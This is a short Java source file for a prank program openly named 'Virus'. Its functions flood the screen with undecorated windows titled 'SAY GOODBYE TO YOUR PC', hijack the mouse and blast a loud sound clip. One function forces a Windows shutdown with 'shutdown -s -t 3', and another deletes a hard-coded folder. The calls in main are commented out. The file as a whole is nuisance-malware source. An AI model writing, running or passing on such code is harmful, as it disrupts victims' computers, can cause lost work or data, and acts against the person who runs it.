import java.awt.geom.*;
import javax.swing.*;
import java.awt.*;
import java.lang.Math;
import java.io.File;
import java.io.IOException;
import javax.sound.sampled.*;
import java.util.Random;

class Virus extends JComponent {
    // Robot hacker = new Robot();
    private int width;
    private int height;

    public Virus(){

    }

    public Virus(int w, int h) {
        width = w;
        height = h;
    }

    protected void paintComponent(Graphics g) {
        double randRed = Math.random();
        double randGreen = Math.random();
        double randBlue = Math.random();
        int red = (int) (randRed * 255);
        int green = (int) (randGreen * 255);
        int blue = (int) (randBlue * 255);
        Graphics2D g2d = (Graphics2D) g;
        Rectangle2D.Double background = new Rectangle2D.Double(0, 0, 500, 500);
        g2d.setColor(new Color(red, green, blue));
        g2d.fill(background);
        Rectangle2D.Double black = new Rectangle2D.Double(20, 20, 600, 700);
        g2d.setColor(new Color(0, 0, 0));
        g2d.fill(black);
        Rectangle2D.Double redd = new Rectangle2D.Double(400, 400, 600, 700);
        g2d.setColor(new Color(255, 0, 0));
        g2d.fill(redd);
    }

    private static void lagMachine(int windows)
            throws AWTException, UnsupportedAudioFileException, IOException, LineUnavailableException {
        for (int i = 0; i < windows; i++) {
            Random rand = new Random();
            int xLoc = rand.nextInt(2561);
            int yLoc = rand.nextInt(1441);
            JFrame j = new JFrame();
            j.setUndecorated(true);
            j.setShape(new Ellipse2D.Double(xLoc / 4, yLoc / 2, xLoc / 4, yLoc / 2));
            Virus dc = new Virus(1000, 1000);
            j.setSize(1000, 1000);
            j.setTitle("SAY GOODBYE TO YOUR PC");
            // j.setDefaultLookAndFeelDecorated(true);
            j.setResizable(false);
            j.add(dc);
            j.setLocation(xLoc, yLoc);
            // j.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            j.setVisible(true);
            Robot hacker = new Robot();
            hacker.mouseMove(xLoc, yLoc);
            earBurst();
        }
    }

    private static void endPC() throws AWTException {
        Runtime runtime = Runtime.getRuntime();
        try {
            System.out.println("Shutting down the PC after 3 seconds.");
            runtime.exec("shutdown -s -t 3");
        } catch (IOException e) {
            System.out.println("Exception: " + e);
        }
    }

    public static void earBurst()
            throws AWTException, UnsupportedAudioFileException, IOException, LineUnavailableException {
        File file = new File("Windows Xp Error Earrape.wav");
        AudioInputStream audioStream = AudioSystem.getAudioInputStream(file);
        Clip clip = AudioSystem.getClip();
        clip.open(audioStream);
        clip.start();
    }

    public static void deleteFiles() throws IOException {
        File file = new File("C:\\java_delete_this\\");
        file.delete();
    }

    public static void main(String args[])
            throws AWTException, UnsupportedAudioFileException, IOException, LineUnavailableException {
        // lagMachine(200);
        // deleteFiles();
        // endPC();

    }
}
